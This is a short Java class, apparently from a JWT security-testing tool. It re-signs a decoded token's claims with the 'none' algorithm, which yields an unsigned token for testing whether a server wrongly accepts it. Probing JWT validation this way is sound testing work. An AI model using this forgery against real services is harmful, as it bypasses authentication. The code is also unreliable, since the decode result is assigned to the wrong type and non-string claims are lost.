package app;

import com.auth0.jwt.JWT;
import com.auth0.jwt.JWTCreator.Builder;
import com.auth0.jwt.algorithms.Algorithm;

public class TokenManipulator {
	
	public static String setAlgorithmToNone(String token) { 
		JWT origToken = JWT.decode(token);
		
		Builder noneTokenBuilder = JWT.create();
		
		for(String key : origToken.getClaims().keySet()) { 
			noneTokenBuilder = noneTokenBuilder.withClaim(key, origToken.getClaim(key).asString());
		}
				
		return noneTokenBuilder.sign(Algorithm.none());
	}

}
